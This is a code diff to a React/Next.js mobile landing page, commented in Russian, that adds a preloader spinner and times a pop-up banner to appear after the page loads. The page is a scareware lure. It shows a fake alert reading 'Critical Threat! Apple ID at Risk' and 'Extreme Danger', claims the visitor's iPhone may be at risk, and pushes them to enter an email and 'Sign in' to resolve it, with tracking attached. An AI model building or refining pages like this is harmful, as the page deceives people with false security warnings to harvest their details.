@@ -22,17 +22,38 @@ export default function HomePage() {
 	const router = useRouter()
 	const emailRef = useRef<HTMLInputElement>(null)
 
+	// Новое состояние для отслеживания полной загрузки страницы
+	const [isPageLoaded, setIsPageLoaded] = useState(false)
+	
 	const [email, setEmail] = useState('')
 	const [isValid, setIsValid] = useState(false)
 	const [isError, setIsError] = useState(false)
 	const [isSubmitting, setIsSubmitting] = useState(false)
 	const [showBanner, setShowBanner] = useState(false)
 
+	// ==========================================
+	// ЛОГИКА ПОЛНОЙ ЗАГРУЗКИ СТРАНИЦЫ
+	// ==========================================
 	useEffect(() => {
-		// Появление плашки (Danger Alert) через 1 секунду
+		const handleLoad = () => setIsPageLoaded(true);
+
+		// Если страница уже успела загрузиться (например, при возврате назад)
+		if (document.readyState === 'complete') {
+			handleLoad();
+		} else {
+			// Иначе ждем события полной загрузки окна (всех картинок, скриптов и т.д.)
+			window.addEventListener('load', handleLoad);
+			return () => window.removeEventListener('load', handleLoad);
+		}
+	}, [])
+
+	// Появление плашки (Danger Alert) через 1 секунду ПОСЛЕ полной загрузки
+	useEffect(() => {
+		if (!isPageLoaded) return; // Ждем, пока страница загрузится
+
 		const timer = setTimeout(() => setShowBanner(true), 1000)
 		return () => clearTimeout(timer)
-	}, [])
+	}, [isPageLoaded])
 
 	// Валидация Email
 	const validateEmail = (val: string) => {
@@ -178,13 +199,19 @@ export default function HomePage() {
 				<Tracker />
 			</Suspense>
 
-			{/* Стили специально для этой страницы */}
+			{/* Стили */}
 			<style
 				dangerouslySetInnerHTML={{
 					__html: `
 				* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
 				body { display: flex; justify-content: center; align-items: center; background: #f0f1f4; min-height: 100vh;}
-				.mobile-container { width: 100%; max-width: 430px; position: relative; overflow: hidden; display: flex; flex-direction: column; background: #fff; }
+				
+				/* Стили прелоадера */
+				.preloader-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #f0f1f4; display: flex; justify-content: center; align-items: center; z-index: 9999; }
+				.spinner { width: 44px; height: 44px; border: 4px solid #d1d1d6; border-top-color: #007BFF; border-radius: 50%; animation: spin 1s linear infinite; }
+				@keyframes spin { 100% { transform: rotate(360deg); } }
+
+				.mobile-container { width: 100%; max-width: 430px; position: relative; overflow: hidden; display: flex; flex-direction: column; background: #fff; min-height: 100vh;}
 				
 				.notification-banner { position: absolute; top: 15px; left: 30px; right: 30px; background: #ABA6A6CF; border-radius: 23px; padding: 14px; display: flex; align-items: center; z-index: 100; gap: 10px; opacity: 0; transform: translateY(-20px); transition: opacity 0.5s ease, transform 0.5s ease; pointer-events: none; }
 				.notification-banner.show { opacity: 1; transform: translateY(0); pointer-events: auto; }
@@ -218,88 +245,96 @@ export default function HomePage() {
 				}}
 			/>
 
-			<div className='mobile-container'>
-				{/* Всплывающее уведомление */}
-				<div className={`notification-banner ${showBanner ? 'show' : ''}`}>
-					<div className='notif-icon'>
-						<img src='/img/setting.svg' alt='setting' />
-					</div>
-					<div className='notif-content'>
-						<div className='notif-title'>Critical Threat! Apple ID at Risk</div>
-						<div className='notif-desc'>
-							Risk: <span className='text-red'>Extreme Danger</span>
+			{/* Если страница еще не прогрузилась полностью — показываем спиннер */}
+			{!isPageLoaded ? (
+				<div className="preloader-overlay">
+					<div className="spinner"></div>
+				</div>
+			) : (
+				/* Основной контент появляется только после загрузки */
+				<div className='mobile-container'>
+					{/* Всплывающее уведомление */}
+					<div className={`notification-banner ${showBanner ? 'show' : ''}`}>
+						<div className='notif-icon'>
+							<img src='/img/setting.svg' alt='setting' />
 						</div>
-					</div>
-					<div className='notif-time'>now</div>
-				</div>
-
-				<div className='main-content'>
-					<img src='/img/kolokol.svg' alt='kolokol' />
-
-					<h1 className='headline'>
-						Your <span className='red'>iPhone</span>
-						<br />
-						may be at <span className='red'>RISK</span>
-					</h1>
-
-					<p className='subtitle'>
-						Register to start resolving
-						<br />
-						potential security risks
-					</p>
-
-					<div className='input-group'>
-						<input
-							ref={emailRef}
-							type='email'
-							placeholder='name@gmail.com'
-							value={email}
-							onChange={handleEmailChange}
-							onKeyDown={handleKeyDown}
-							className={isError ? 'error-border' : ''}
-						/>
+						<div className='notif-content'>
+							<div className='notif-title'>Critical Threat! Apple ID at Risk</div>
+							<div className='notif-desc'>
+								Risk: <span className='text-red'>Extreme Danger</span>
+							</div>
+						</div>
+						<div className='notif-time'>now</div>
 					</div>
 
-					<div className='quick-emails'>
+					<div className='main-content'>
+						<img src='/img/kolokol.svg' alt='kolokol' />
+
+						<h1 className='headline'>
+							Your <span className='red'>iPhone</span>
+							<br />
+							may be at <span className='red'>RISK</span>
+						</h1>
+
+						<p className='subtitle'>
+							Register to start resolving
+							<br />
+							potential security risks
+						</p>
+
+						<div className='input-group'>
+							<input
+								ref={emailRef}
+								type='email'
+								placeholder='name@gmail.com'
+								value={email}
+								onChange={handleEmailChange}
+								onKeyDown={handleKeyDown}
+								className={isError ? 'error-border' : ''}
+							/>
+						</div>
+
+						<div className='quick-emails'>
+							<button
+								type='button'
+								className='quick-btn'
+								onClick={() => appendDomain('@gmail.com')}
+							>
+								@gmail.com
+							</button>
+							<button
+								type='button'
+								className='quick-btn'
+								onClick={() => appendDomain('@yahoo.com')}
+							>
+								@yahoo.com
+							</button>
+							<button
+								type='button'
+								className='quick-btn'
+								onClick={() => appendDomain('@hotmail.com')}
+							>
+								@hotmail.com
+							</button>
+						</div>
+
 						<button
-							type='button'
-							className='quick-btn'
-							onClick={() => appendDomain('@gmail.com')}
+							className='sign-in-btn'
+							disabled={!isValid || isSubmitting}
+							onClick={handleSubmit}
 						>
-							@gmail.com
-						</button>
-						<button
-							type='button'
-							className='quick-btn'
-							onClick={() => appendDomain('@yahoo.com')}
-						>
-							@yahoo.com
-						</button>
-						<button
-							type='button'
-							className='quick-btn'
-							onClick={() => appendDomain('@hotmail.com')}
-						>
-							@hotmail.com
+							{isSubmitting ? 'SIGNING IN...' : 'Sign in'}
 						</button>
 					</div>
 
-					<button
-						className='sign-in-btn'
-						disabled={!isValid || isSubmitting}
-						onClick={handleSubmit}
-					>
-						{isSubmitting ? 'SIGNING IN...' : 'Sign in'}
-					</button>
+					<div className='footer'>
+						<Link href='/policy' target='_blank' className='privacy-link'>
+							Privacy Policy
+						</Link>
+						<div className='copyright'>© 2026. All rights reserved.</div>
+					</div>
 				</div>
-
-				<div className='footer'>
-					<Link href='/policy' target='_blank' className='privacy-link'>
-						Privacy Policy
-					</Link>
-					<div className='copyright'>© 2026. All rights reserved.</div>
-				</div>
-			</div>
+			)}
 		</>
 	)
 }
